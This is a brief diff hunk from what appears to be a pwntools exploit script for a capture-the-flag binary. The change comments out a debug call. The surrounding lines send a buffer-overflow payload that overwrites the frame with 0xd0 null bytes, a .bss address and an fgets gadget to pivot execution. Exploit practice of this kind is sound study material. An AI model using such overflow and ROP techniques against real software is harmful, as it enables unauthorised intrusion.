@@ -62,7 +62,7 @@ if __name__ == "__main__":
     io.sendlineafter("??\n", "0000")
     io.sendlineafter(": \n", "1111")
 
-    DEBUG([0x19BC])
+    #  DEBUG([0x19BC])
     fgets_gadgets = 0x18B9 + elf.address
     bof(flat(['\0' * 0xd0, elf.bss() + 0x500, fgets_gadgets]))
 
